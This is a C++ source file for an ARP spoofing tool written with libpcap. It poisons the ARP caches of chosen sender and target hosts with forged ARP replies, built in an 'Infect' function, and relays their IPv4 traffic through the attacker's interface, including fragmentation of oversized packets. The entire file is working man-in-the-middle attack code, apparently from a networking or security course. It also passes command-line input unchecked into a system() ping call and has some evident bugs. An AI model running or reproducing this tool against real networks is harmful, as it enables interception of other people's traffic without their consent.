#include <iostream>
#include <string>
#include <list>
#include <map>
#include <vector>
#include <ctime>

#include <cstdlib>

#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <net/if_arp.h>
#include <unistd.h>

#include "pcap.h"
#include "../../include/mac.h"
#include "../../include/ethhdr.h"
#include "../../include/arphdr.hpp"
#include "../../include/iphdr.hpp"
#include "../../include/tcphdr.hpp"

using namespace std;

#define TICK_TIME           50000
#define MAX_MTU             1500
#define MAX_MSS             1460
#define UDP_HEADER_SIZE     8

struct Flow {
    Ip sip_;
    Ip tip_;

    Flow() {}
    Flow(const string senderIP, const string targetIP) { sip_ = senderIP; tip_ = targetIP; }


    bool operator==(const Flow& f) { if(sip_ == f.sip_ && tip_ == f.tip_) return true; return false; }
};

struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};

struct Packet {
    pcap_pkthdr* header;
    u_char* buf;
};

void usage();

bool parse(int argc);
list<Flow> GetFlowList(int argc, char* argv[]);
bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable);
Mac GetInterfaceMac(string interface);
Mac ResolveMac(const string interface, const Ip ip);
pcap_t* OpenPcap(const string Interface);
bool SendPacket(pcap_t* pcap, uint8_t* data,const int size);
Packet ReadPacket(pcap_t* pcap);
bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port);
void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket);
void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket);
//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac);
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP);

Ip myIp(string("192.168.0.106"));


int main(int argc, char* argv[])
{
    try {
        if(!parse(argc)) throw runtime_error("Failed to parse");

        string interface(argv[1]);

        Mac attackMac = GetInterfaceMac(interface);

        list<Flow> flowList = GetFlowList(argc, argv);
        if(flowList.empty()) throw runtime_error("Failed to get flow list");

        map<Ip, Mac> arpTable{};
        if(!GetArpTable(interface, flowList, arpTable)) throw runtime_error("Failed to get arp table");

        pcap_t* pcap = OpenPcap(interface);
        if(pcap == NULL) throw runtime_error("Failed to open pcap");

        int currentTime = 0;
        Packet rPacket;

        do {
            if((clock() - currentTime) > TICK_TIME) {
                currentTime = clock();

                for(Flow& f : flowList)
                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) throw runtime_error("Failed to infect");
            }

            //while
            rPacket = ReadPacket(pcap);

            PEthHdr etherHeader = reinterpret_cast<PEthHdr>(rPacket.buf);
            PArpHdr arpHeader = reinterpret_cast<PArpHdr>(rPacket.buf + sizeof(EthHdr));
            PIpHdr ipHeader = reinterpret_cast<PIpHdr>(rPacket.buf + sizeof(EthHdr));
            PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(rPacket.buf + sizeof(EthHdr) + ipHeader->len());

            for(const Flow& f : flowList) {
                //arp
                //sender -> target
                if(etherHeader->type() == EthHdr::Arp && (ntohl(arpHeader->sip_) == f.sip_ && ntohl(arpHeader->tip_) == f.tip_)) {
                    if(!Infect(pcap, attackMac, arpTable[f.tip_], f.sip_, f.tip_)) {
                        cout<<"Failed to infect \n";
                    }
                    break;
                }

                //icmp
                //tcp
                //udp
                //sender -> target
                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->sip_) == f.sip_ && ntohl(ipHeader->dip_) != myIp)) {
                    etherHeader->smac_ = attackMac;
                    etherHeader->dmac_ = arpTable[f.tip_];

                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
                    if(rPacket.header->caplen > MAX_MTU)
                        JumboPacketProcessing(pcap, rPacket);
                        //JumboFrameTcpProcessing(pcap, rPacket);
                    else
                        SendPacket(pcap, rPacket.buf, rPacket.header->caplen);

                    break;
                }

                //target -> sender
                if(etherHeader->type() == EthHdr::Ip4 && (ntohl(ipHeader->dip_) == f.tip_ && ntohl(ipHeader->sip_) != myIp)) {
                    etherHeader->smac_ = attackMac;
                    etherHeader->dmac_ = arpTable[f.tip_];

                    //udp, icmp ... -> auto ip fragment ex) caplen : 4000, ip header : 1500
                    if(rPacket.header->caplen > MAX_MTU)
                        JumboPacketProcessing(pcap, rPacket);
                        //JumboFrameTcpProcessing(pcap, rPacket);
                    else
                        SendPacket(pcap, rPacket.buf, rPacket.header->caplen);

                    break;
                }
            }
        }while(true);

        pcap_close(pcap);

    }catch(const exception& e) {
        cerr<<"main : "<<e.what()<<endl;
        return -1;
    }
}

void usage() {
    string ret = " syntax arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...] \n sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2";
    cout<<ret<<endl;
}

bool parse(int argc) {
    if(argc < 2 || argc % 2 != 0) {
        usage();
        return false;
    }

    return true;
}

list<Flow> GetFlowList(int argc, char* argv[]) {
    list<Flow> flowList_{};

    for(int i=2; i<argc; i+= 2) {
        flowList_.push_back(Flow(argv[i], argv[i+1]));
        //flowList_.push_back(Flow(argv[i+1], argv[i]));
    }

    return flowList_;
}


bool GetArpTable(const string interface, const list<Flow>& flowList, map<Ip, Mac>& arpTable) {
    try {
        for(const Flow& f : flowList) {
            if(!arpTable.count(f.sip_)) {
                Mac tmp = ResolveMac(interface, f.sip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve sender ip");

                arpTable[f.sip_] = tmp;
            }

            if(!arpTable.count(f.tip_)) {
                Mac tmp = ResolveMac(interface, f.tip_);
                if(tmp.isNull()) throw runtime_error("Failed to resolve target ip");

                arpTable[f.tip_] = tmp;
            }
        }
    }catch(const exception& e ) {
        cerr<<"GetArpTable : "<<e.what()<<endl;
        return false;
    }

    return true;
}

Mac GetInterfaceMac(const string interface) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    Mac ret{};

    ifreq ifr{};

    strncpy(ifr.ifr_ifrn.ifrn_name, interface.c_str(), IFNAMSIZ - 1);

    try {
        if(sock < 0)
            throw runtime_error("Failed to creat socket");

        if(ioctl(sock, SIOCGIFHWADDR, &ifr) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(ifr.ifr_ifru.ifru_hwaddr.sa_data);
    }
    catch(const exception& e) {
        cerr<<"GetInterfaceMac : "<<e.what() <<endl;
        cerr<<"Error : "<< errno <<" (" << strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

Mac ResolveMac(const string interface, const Ip ip) {
    Mac ret{};

    string cmd = "ping -c 1  " + string(ip);
    system(cmd.c_str());

    int sock = socket(AF_INET, SOCK_DGRAM, 0);

    try {
        if(sock < 0) throw runtime_error("Failed to create socket");

        arpreq req{};

        req.arp_pa.sa_family = AF_INET;
        strncpy(req.arp_dev, interface.c_str(), IFNAMSIZ - 1);
        reinterpret_cast<sockaddr_in*>(&req.arp_pa)->sin_addr.s_addr = htonl(ip);


        if(ioctl(sock, SIOCGARP, &req) == -1)
            throw runtime_error("Failed to set ioctl");

        ret = reinterpret_cast<u_char*>(req.arp_ha.sa_data);

    }catch(const exception& e) {
        cerr<<"GetMacAddress : "<<e.what()<<endl;
        cerr<<"Error : "<<errno<<" ("<<strerror(errno)<<")"<<endl;
    }

    close(sock);

    return ret;
}

pcap_t* OpenPcap(const string interface) {
    pcap_t* pcap;
    char errBuf[PCAP_ERRBUF_SIZE]{};

    pcap = pcap_open_live(interface.c_str(), BUFSIZ, 1, 1, errBuf);
    if(pcap == NULL)
        cerr<<"OpenPcap : "<<"Failed to open pcap : " + string(errBuf) <<endl;

    return pcap;
}

bool SendPacket(pcap_t* pcap, uint8_t* data, const int size) {
    if(pcap_sendpacket(pcap, reinterpret_cast<u_char*>(data), size) == -1) {
        cerr<<"SendPacket : "<<"Failed to send packet "<<string(pcap_geterr(pcap))<<endl;
        return false;
    }

    return true;
}

Packet ReadPacket(pcap_t* pcap) {
    Packet packet{};
    //vector<Packet> packets{};

    while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) != 1);
    // while(pcap_next_ex(pcap, &packet.header, (const u_char**)&packet.buf) == 1) {
    //     packets.push_back(packet);
    //     //usleep(1000);
    // }

    //cout<< "Packet cnt : " << packets.size() << endl;

    return packet;
}

bool FindPacket(Packet packet, const uint16_t etherType, const Ip ip, const IpHdr::PROTOCOL_ID_TYPE type, const uint16_t port) {
    //arp header size : 28
    if(packet.header->caplen < sizeof(EthHdr) + sizeof(IpHdr)) return false;

    EthHdr* etherHeader = reinterpret_cast<EthHdr*>(packet.buf);

    if(etherHeader->type() != etherType) return false;

    switch(etherHeader->type()) {
    case EthHdr::Arp: {
        return true;
        break;
    }
    case EthHdr::Ip4: {
        IpHdr* ipHeader = reinterpret_cast<IpHdr*>(packet.buf + sizeof(EthHdr));
        //Ip struct compare

        if(ntohl(ipHeader->sip_) == ip || ntohl(ipHeader->dip_) == ip) {
            if(type != 0 && ipHeader->protocolId_ != type) return false;

            switch(ipHeader->protocolId_) {
            case IpHdr::PROTOCOL_ID_TYPE::IPv4: {
                return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::ICMP: {
                return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::TCP: {
                TcpHdr* tcpHeader = reinterpret_cast<TcpHdr*>(packet.buf + sizeof(EthHdr) + ipHeader->len());
                if(port == 0 || (port == tcpHeader->sPort() || port == tcpHeader->dPort()))
                    return true;
                break;
            }
            case IpHdr::PROTOCOL_ID_TYPE::UDP: {
                return true;
                break;
            }
            defualt:
                break;
            }
        }
        break;
    }
    default:
        break;
    }

    return false;
}

uint16_t CalculateIpChecksum(const void* vdata, size_t length) {
    const uint8_t* data = (const uint8_t*)vdata;
    uint32_t acc = 0;

    for (size_t i = 0; i + 1 < length; i += 2) {
        uint16_t word;
        memcpy(&word, data + i, 2);
        acc += ntohs(word);
    }

    if (length & 1) {
        uint16_t word = 0;
        memcpy(&word, data + length - 1, 1);
        acc += ntohs(word);
    }

    while (acc >> 16)
        acc = (acc & 0xFFFF) + (acc >> 16);

    return htons(~acc);
}

struct PseudoHeader {
    Ip srcAddr;
    Ip dstAddr;
    uint8_t reserved;
    uint8_t protocol;
    uint16_t tcpLen;
};

uint16_t CalculateTcpChecksum(IpHdr* ipHdr, TcpHdr* tcpHdr, const uint8_t* payload, uint16_t payloadLen) {
    uint16_t tcpLen = tcpHdr->len() + payloadLen;
    PseudoHeader pseudoHdr;

    pseudoHdr.srcAddr = ipHdr->sip_;
    pseudoHdr.dstAddr = ipHdr->dip_;
    pseudoHdr.reserved = 0;
    pseudoHdr.protocol = IPPROTO_TCP;
    pseudoHdr.tcpLen = htons(tcpLen);

    uint32_t acc = 0;

    // Pseudo header
    const uint16_t* pseudoPtr = (const uint16_t*)&pseudoHdr;
    for (int i = 0; i < sizeof(PseudoHeader)/2; ++i) {
        acc += ntohs(pseudoPtr[i]);
    }

    // TCP header + payload
    const uint8_t* tcpData = (const uint8_t*)tcpHdr;
    for (int i = 0; i + 1 < tcpLen; i += 2) {
        uint16_t word;
        memcpy(&word, tcpData + i, 2);
        acc += ntohs(word);
    }

    if (tcpLen & 1) {
        uint16_t word = 0;
        memcpy(&word, tcpData + tcpLen - 1, 1);
        acc += ntohs(word);
    }

    while (acc >> 16)
        acc = (acc & 0xFFFF) + (acc >> 16);

    return htons(~acc);
}

// void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
//     PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
//     PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
//     PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());

//     //udp or tcp
//     const int headerLen = oriIpHeader->protocolId_ == IpHdr::UDP
//                               ? oriIpHeader->len() + UDP_HEADER_SIZE
//                               : oriIpHeader->len() + oriTcpHeader->len();
//     const int maxFragmentPacketSize = MAX_MTU - oriIpHeader->len();
//     int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - headerLen;

//     int sendedPacketSize = 0;
//     int fragmentPacketSize = 0;
//     int fragmentOffset = 0;

//     bool test = true;

//     while(remainingPacketSize > 0) {
//         fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
//                                  ? remainingPacketSize : maxFragmentPacketSize;

//         unique_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + sizeof(EthHdr) + headerLen]);
//         //header
//         if(test) {
//             memcpy(fragmentPacketBuf.get(), jPacket.buf, sizeof(EthHdr) + headerLen);
//         }else {
//             memcpy(fragmentPacketBuf.get(), jPacket.buf, sizeof(EthHdr) + oriIpHeader->len());
//         }
//         //data
//         if(test) {
//             memcpy(fragmentPacketBuf.get() + sizeof(EthHdr) + headerLen, jPacket.buf + sizeof(EthHdr) + headerLen + sendedPacketSize, fragmentPacketSize);
//             test = false;
//         }else {
//             memcpy(fragmentPacketBuf.get() + sizeof(EthHdr) + oriIpHeader->len(), jPacket.buf + sizeof(EthHdr) + headerLen + sendedPacketSize, fragmentPacketSize);
//         }

//         PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));

//         ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
//             ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
//             : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);

//         ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + fragmentPacketSize);

//         remainingPacketSize -= fragmentPacketSize;
//         sendedPacketSize += fragmentPacketSize;
//         fragmentOffset += fragmentPacketSize / 8;

//         SendPacket(pcap, reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), sizeof(EthHdr) + oriIpHeader->len() + fragmentPacketSize);
//     }
// }

void JumboPacketProcessing(pcap_t* pcap, const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));

    //udp or tcp
    const int ipHeaderLen = oriIpHeader->len();
    const int totalHeaderLen = sizeof(EthHdr) + ipHeaderLen;
    const int maxFragmentPacketSize = MAX_MTU - ipHeaderLen;
    int remainingPacketSize = jPacket.header->caplen - sizeof(EthHdr) - ipHeaderLen;

    int sendedPacketSize = 0;
    int fragmentPacketSize = 0;
    int fragmentOffset = 0;

    while(remainingPacketSize > 0) {
        fragmentPacketSize = maxFragmentPacketSize > remainingPacketSize
                                 ? remainingPacketSize : maxFragmentPacketSize;

        unique_ptr<uint8_t[]> fragmentPacketBuf(new uint8_t[fragmentPacketSize + totalHeaderLen]);
        //header
        memcpy(fragmentPacketBuf.get(), jPacket.buf, totalHeaderLen);

        //data
        memcpy(fragmentPacketBuf.get() + totalHeaderLen, jPacket.buf + totalHeaderLen + sendedPacketSize, fragmentPacketSize);

        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(fragmentPacketBuf.get() + sizeof(EthHdr));

        ipHeader->flags_fragOffset_ = remainingPacketSize > maxFragmentPacketSize
                                          ? htons(IpHdr::IP_FLAGS_TYPE::MF | fragmentOffset)
                                          : htons(IpHdr::IP_FLAGS_TYPE::RESORVED | fragmentOffset);

        ipHeader->totalPacketLen_ = htons(ipHeaderLen + fragmentPacketSize);
        ipHeader->headerChecksum_ = 0;
        ipHeader->headerChecksum_ = CalculateIpChecksum(ipHeader, ipHeader->len());

        remainingPacketSize -= fragmentPacketSize;
        sendedPacketSize += fragmentPacketSize;
        fragmentOffset += fragmentPacketSize / 8;

        SendPacket(pcap, reinterpret_cast<uint8_t*>(fragmentPacketBuf.get()), totalHeaderLen + fragmentPacketSize);
    }
}

void JumboFrameTcpProcessing(pcap_t* pcap, const Packet& jPacket) {
    PEthHdr oriEtherHeader = reinterpret_cast<PEthHdr>(jPacket.buf);
    PIpHdr oriIpHeader = reinterpret_cast<PIpHdr>(jPacket.buf + sizeof(EthHdr));
    PTcpHdr oriTcpHeader = reinterpret_cast<PTcpHdr>(jPacket.buf + sizeof(EthHdr) + oriIpHeader->len());

    const uint32_t totalHeaderLen = sizeof(EthHdr) + oriIpHeader->len() + oriTcpHeader->len();
    uint32_t tcpPayloadSize = oriIpHeader->totalLen() - oriIpHeader->len() - oriTcpHeader->len();

    uint32_t sendBytes = 0, sendedBytes = 0;

    while(tcpPayloadSize) {
        sendBytes = tcpPayloadSize > MAX_MSS ? MAX_MSS : tcpPayloadSize;
        unique_ptr<uint8_t> segmentPacket(new uint8_t[MAX_MSS + totalHeaderLen]);

        //header
        memcpy(segmentPacket.get(), jPacket.buf, totalHeaderLen);
        //data
        memcpy(segmentPacket.get() + totalHeaderLen, jPacket.buf + totalHeaderLen, sendBytes);



        PIpHdr ipHeader = reinterpret_cast<PIpHdr>(segmentPacket.get() + sizeof(EthHdr));
        ipHeader->totalPacketLen_ = htons(oriIpHeader->len() + oriTcpHeader->len() + sendBytes);
        //id?
        ipHeader->id_ += ntohs(sendedBytes);
        //checksum?
        ipHeader->headerChecksum_ = 0;
        ipHeader->headerChecksum_ = CalculateIpChecksum(ipHeader, ipHeader->len());

        PTcpHdr tcpHeader = reinterpret_cast<PTcpHdr>(segmentPacket.get() + sizeof(EthHdr) + ipHeader->len());
        tcpHeader->seqNumber_ =  htonl(ntohl(oriTcpHeader->seqNumber_) + sendedBytes);
        //checksum?
        tcpHeader->checksum_ = 0;
        tcpHeader->checksum_ = CalculateTcpChecksum(ipHeader, tcpHeader, (reinterpret_cast<uint8_t*>(tcpHeader) + tcpHeader->len()), sendBytes);

        sendedBytes += sendBytes;
        tcpPayloadSize -= sendBytes;

        SendPacket(pcap, segmentPacket.get(), totalHeaderLen + sendBytes);
    }
}

//bool Infect(pcap_t* pcap, const Mac& attackerMac, const Flow& flow, const Mac& targetMac) {
bool Infect(pcap_t* pcap, const Mac& attackerMac, const Mac& targetMac, const Ip& senderIP, const Ip& targetIP) {
    try {
        if(targetMac.isNull()) throw runtime_error("target mac is null");

        EthArpPacket packet{};

        packet.eth_.dmac_ = targetMac;
        packet.arp_.tmac_ = targetMac;

        packet.eth_.smac_ = attackerMac;
        packet.arp_.smac_ = attackerMac;

        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.harwareType_ = htons(ArpHdr::ETHERNET);
        packet.arp_.protocolType_ = htons(EthHdr::Ip4);
        packet.arp_.hardwareSize_ = ArpHdr::ETHERNET_LEN;
        packet.arp_.protocolSize_ = ArpHdr::PROTOCOL_LEN;
        packet.arp_.opCode_ = htons(ArpHdr::OpCodeType::Arp_Reply);

        packet.arp_.sip_ = htonl(senderIP);
        packet.arp_.tip_ = htonl(targetIP);

        SendPacket(pcap, reinterpret_cast<uint8_t*>(&packet), sizeof(EthArpPacket));

    }catch(const std::exception& e) {
        cerr<<"Failed to infect : "<<e.what()<<endl;
        return false;
    }
    return true;
}
